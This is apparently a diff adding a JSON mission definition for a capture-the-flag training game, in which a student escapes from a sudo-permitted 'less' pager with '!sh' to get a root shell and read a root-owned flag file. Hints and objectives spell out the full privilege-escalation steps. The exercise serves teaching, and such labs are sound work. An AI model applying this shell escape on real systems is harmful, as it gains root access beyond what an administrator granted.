@@ -1,0 +1,17 @@
+{
+  "id": "B2",
+  "slug": "gtfo",
+  "part": 2,
+  "title": "GTFO",
+  "kind": "program",
+  "bonus": true,
+  "bug_hunting": false,
+  "story": "[BONUS MISSION - PART 2]\nAn administrator granted `student` permission to run `/usr/bin/less /var/log/quest-demo.log` as `root` via `sudo`. In real penetration testing and bug hunting (see GTFOBins), interactive pagers running as `root` allow shell escapes (`!sh`) that spawn a root shell.",
+  "objective": "1. Run `sudo -l` to inspect the permitted `less` command.\n2. Run `sudo /usr/bin/less /var/log/quest-demo.log`.\n3. Inside `less`, type `!sh` (or `!cat /root/b2_flag.txt`) and press Enter to read `/root/b2_flag.txt` as `root`.\n4. Exit `less` (`q`) and submit the `CYBERUS{...}` flag with `quest submit`.",
+  "hints": [
+    "Run `sudo -l` to see the exact command: `sudo /usr/bin/less /var/log/quest-demo.log`.",
+    "Once `less` opens the file in your terminal, type `!sh` and press Enter to spawn a root shell.",
+    "In the root shell (`#`), run `cat /root/b2_flag.txt`, then `exit` and `q`, and submit the flag."
+  ],
+  "commands_taught": ["sudo", "less", "cat"]
+}
